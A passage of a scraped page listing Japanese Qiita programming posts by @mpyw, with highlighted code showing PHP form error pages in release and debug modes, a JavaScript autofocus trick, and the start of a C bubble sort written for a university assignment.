<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>以下の内容で登録しました。<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">dl</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>名前<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>@mpyw<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>年齢<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>20<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>
</div>

<h2>
<span id="リリース時の異常入力例" class="fragment"></span><a href="#%E3%83%AA%E3%83%AA%E3%83%BC%E3%82%B9%E6%99%82%E3%81%AE%E7%95%B0%E5%B8%B8%E5%85%A5%E5%8A%9B%E4%BE%8B"><i class="fa fa-link"></i></a><strong>リリース時の異常入力例</strong>
</h2>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">名前と年齢が両方ともチェックに引っかかったとき</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>My Site<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>エラーが発生しました<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>名前が入力されていません<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>年齢は数字で入力してください<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">エラーや自動的に発生する例外全般</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>My Site<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>内部サーバーエラー<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>大変ご不便をおかけしております。申し訳ございません。<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>
</div>

<h2>
<span id="デバッグ時の異常入力例" class="fragment"></span><a href="#%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E6%99%82%E3%81%AE%E7%95%B0%E5%B8%B8%E5%85%A5%E5%8A%9B%E4%BE%8B"><i class="fa fa-link"></i></a><strong>デバッグ時の異常入力例</strong>
</h2>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">名前と年齢が両方ともチェックに引っかかったとき</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>My Site<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>例外発生<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">dl</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>メッセージ<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>名前が入力されていません<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>ファイル<span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>C:\xampp\htdocs\MySite\register.php<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>行<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>9<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">dl</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">dl</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>メッセージ<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>年齢は数字で入力してください<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>ファイル<span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>C:\xampp\htdocs\MySite\register.php<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>行<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>12<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">dl</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">$_POST['name']が未定義のとき</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>My Site<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>例外発生<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">dl</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>メッセージ<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>Undefined index: name<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>ファイル<span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>C:\xampp\htdocs\MySite\register.php<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>行<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>8<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">dl</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">リモートのデータベースサーバーに接続できなかったとき</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>My Site<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>例外発生<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">dl</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>メッセージ<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>PDO::__construct(): <span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>ファイル<span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>C:\xampp\htdocs\MySite\register.php<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>行<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>17<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">dl</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">dl</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>メッセージ<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>ファイル<span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>C:\xampp\htdocs\MySite\register.php<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>行<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>17<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">dl</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">WindowsでMySQLを起動するのを忘れていたとき</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>My Site<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>例外発生<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">dl</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>メッセージ<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>SQLSTATE[HY000] [2002] 対象のコンピューターによって拒否されたため、接続できませんでした。
<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>ファイル<span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>C:\xampp\htdocs\MySite\register.php<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>行<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>17<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">dl</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">データベースでのアカウント認証に失敗したとき</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>My Site<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>例外発生<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">dl</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>メッセージ<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>SQLSTATE[HY000] [1045] Access denied for user <span class="ni">&amp;#039;</span>root<span class="ni">&amp;#039;</span>@<span class="ni">&amp;#039;</span>localhost<span class="ni">&amp;#039;</span> (using password: YES)<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>ファイル<span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>C:\xampp\htdocs\MySite\register.php<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>行<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>17<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">dl</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">$_POSTに余分な値が渡されたとき</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>My Site<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>例外発生<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">dl</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>メッセージ<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>SQLSTATE[HY093]: Invalid parameter number: parameter was not defined<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>ファイル<span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>C:\xampp\htdocs\MySite\register.php<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dt</span><span class="p">&gt;</span>行<span class="p">&lt;/</span><span class="nt">dt</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">dd</span><span class="p">&gt;</span>21<span class="p">&lt;/</span><span class="nt">dd</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">dl</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />43位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>23</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/7d7eba54e71146cee50d">オートフォーカスしてカーソルを末尾に移動させる小技</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-10-14 21:07:23</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[HTML]</b> <b>[JavaScript]</b> <b>[HTML5]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>HTML5の <strong>autofocus</strong> 属性を使うとChrome以外でうまく動作しないので別の方法を採用しました。<br>
jQueryを使ったほうが短く書けますが、ここでは使わずに書いてみます。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHP</span></div>
<div class="highlight"><pre><span></span><span class="nv">$val</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'val'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'val'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'val'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$val</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="javascript">
<div class="code-lang"><span class="bold">JavaScript</span></div>
<div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">load_focus</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">elm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">test_form</span><span class="p">.</span><span class="nx">test_text</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">val</span> <span class="o">=</span> <span class="nx">elm</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
  <span class="nx">elm</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
  <span class="nx">elm</span><span class="p">.</span><span class="nx">focus</span><span class="p">();</span>
  <span class="nx">elm</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">HTML</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">"load_focus()"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">form</span> <span class="na">name</span><span class="o">=</span><span class="s">"test_form"</span> <span class="na">method</span><span class="o">=</span><span class="s">"get"</span> <span class="na">action</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>TestText: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"test_text"</span> <span class="na">value</span><span class="o">=</span><span class="s">"&lt;?=val?&gt;"</span><span class="p">&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"送信"</span><span class="p">&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</pre></div>
</div>

<ul>
<li>入力済みのvalueがある場合は一度空にする</li>
<li>フォーカスしてから値をセットする</li>
</ul>

<p>この2点を守るのがポイントです。<br>
これで</p>

<ul>
<li>Internet Explorer</li>
<li>Mozilla Firefox</li>
<li>Google Chrome</li>
</ul>

<p>3ブラウザとも動作確認できました。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />44位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>23</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/e6ef473fe3464599f498">何番煎じか知らないけどソート比較</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-07-28 04:42:44</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[C]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>大学の課題用。</p>

<hr>

<h1>
<span id="データ構造とアルゴリズム-最終課題" class="fragment"></span><a href="#%E3%83%87%E3%83%BC%E3%82%BF%E6%A7%8B%E9%80%A0%E3%81%A8%E3%82%A2%E3%83%AB%E3%82%B4%E3%83%AA%E3%82%BA%E3%83%A0-%E6%9C%80%E7%B5%82%E8%AA%B2%E9%A1%8C"><i class="fa fa-link"></i></a>データ構造とアルゴリズム 最終課題</h1>

<h2>
<span id="profile" class="fragment"></span><a href="#profile"><i class="fa fa-link"></i></a>Profile</h2>

<p>(限定公開から全体公開にしたので伏せます)</p>

<h2>
<span id="system-environment" class="fragment"></span><a href="#system-environment"><i class="fa fa-link"></i></a>System Environment</h2>

<table>
<thead>
<tr>
<th style="text-align: right">Items</th>
<th style="text-align: left">Details</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: right">CPU</td>
<td style="text-align: left">Intel(R) Core(TM) i7-2600K CPU @ 3.40GHz (8 CPUs), ~3.4GHz</td>
</tr>
<tr>
<td style="text-align: right">RAM</td>
<td style="text-align: left">16384 MB</td>
</tr>
<tr>
<td style="text-align: right">OS</td>
<td style="text-align: left">Windows 7 Ultimate 64-bit</td>
</tr>
</tbody>
</table>

<h1>
<span id="bubble-sort" class="fragment"></span><a href="#bubble-sort"><i class="fa fa-link"></i></a>Bubble Sort</h1>

<h2>
<span id="code" class="fragment"></span><a href="#code"><i class="fa fa-link"></i></a>Code</h2>

<div class="code-frame" data-lang="c">
<div class="code-lang"><span class="bold">BubbleSort.c</span></div>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp"></span>

<span class="kt">void</span> <span class="nf">swap</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="kt">long</span> <span class="o">*</span><span class="n">b</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="n">tmp</span> <span class="o">=</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span>
  <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="o">*</span><span class="n">b</span><span class="p">;</span>
  <span class="o">*</span><span class="n">b</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">print_r</span><span class="p">(</span><span class="k">const</span> <span class="kt">long</span> <span class="n">x</span><span class="p">[],</span> <span class="k">const</span> <span class="kt">long</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">long</span> <span class="n">i</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%ld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">i</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">i</span> <span class="o">=</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">10</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
